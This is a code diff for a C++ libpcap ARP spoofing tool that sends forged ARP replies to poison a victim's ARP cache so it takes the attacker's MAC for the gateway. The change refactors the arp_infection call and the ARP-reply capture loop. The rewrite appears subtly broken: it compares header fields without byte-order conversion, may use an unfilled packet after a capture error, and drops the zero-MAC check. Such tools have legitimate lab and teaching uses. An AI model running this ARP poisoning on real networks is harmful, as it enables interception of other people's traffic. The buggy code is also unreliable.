@@ -32,7 +32,7 @@ using namespace std;
 
 bool send_arp_request(const char* dev, Mac my_mac, Ip my_ip, Ip target_ip, Mac& target_mac);
 bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr);
-bool arp_infection(const char *dev, Mac attack_mac, Ip attack_ip, Mac sender_mac, Ip sender_ip, Ip target_ip);
+bool arp_infection(const char *dev, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip);
 
 int main(int argc, char *argv[]) {
     if (argc & 1) {
@@ -48,6 +48,8 @@ int main(int argc, char *argv[]) {
     }
 
     vector<sender_target_ip> send_tar_ips;
+
+
 
     for (int i = 2; i < argc; i += 2) { //check format x.x.x.x
         Ip send_ip = Ip(argv[i]);
@@ -72,18 +74,15 @@ int main(int argc, char *argv[]) {
         }
         //send arp reply to infect
         //sender = victim , target = gateway
-        if (!arp_infection(interface.c_str(), iface_mac, iface_ip,
-            sender_mac, send_tar_ips[i].sender, send_tar_ips[i].target)) {
+        if (!arp_infection(interface.c_str(), iface_mac, sender_mac,
+            send_tar_ips[i].sender, send_tar_ips[i].target)) {
             cout << "Failed ARP infection\n";
             return false;
         }
 
     }
 
-    cout << string(iface_ip) << endl;
-    for (auto send_tar_ip : send_tar_ips) {
-        cout << string(send_tar_ip.sender) << " " << string(send_tar_ip.target) << endl;
-    }
+
 }
 
 bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr) {
@@ -145,35 +144,31 @@ bool send_arp_request(const char* dev, Mac my_mac, Ip my_ip, Ip target_ip, Mac& 
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
     }
+    struct pcap_pkthdr* header;
+    const uint8_t* recv_pkt;
+    int res_recv;
+    EthArpPacket pkt;
 
     while (true) {
-        struct pcap_pkthdr* header;
-        const uint8_t* recv_pkt;
-        int res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
-
+        res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
         if (res_recv == 0) continue;
         if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
             break;
         }
 
-        const EthArpPacket* recv = reinterpret_cast<const EthArpPacket*>(recv_pkt);
-        if (ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
-        if (ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;
-        if (recv->arp_.sip_ != Ip(target_ip)) continue;
-
-        Mac target_mac_tmp = recv->arp_.smac_;
-        target_mac = target_mac_tmp;
+        memcpy(&pkt, recv_pkt, sizeof(EthArpPacket));
+        if (pkt.eth_.type_ != EthHdr::Arp) continue;
+        if (pkt.arp_.op_ != ArpHdr::Reply) continue;
+        if (pkt.arp_.sip_ != target_ip) continue;
         break;
     }
-
+    Mac target_mac_tmp = pkt.arp_.smac_;
+    target_mac = target_mac_tmp;
     pcap_close(pcap);
-    if (target_mac == Mac("00:00:00:00:00:00")) {
-        return false;
-    }
     return true;
 }
 
-bool arp_infection(const char *dev, Mac attack_mac, Ip attack_ip, Mac sender_mac, Ip sender_ip, Ip target_ip) {
+bool arp_infection(const char *dev, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (pcap == nullptr) {
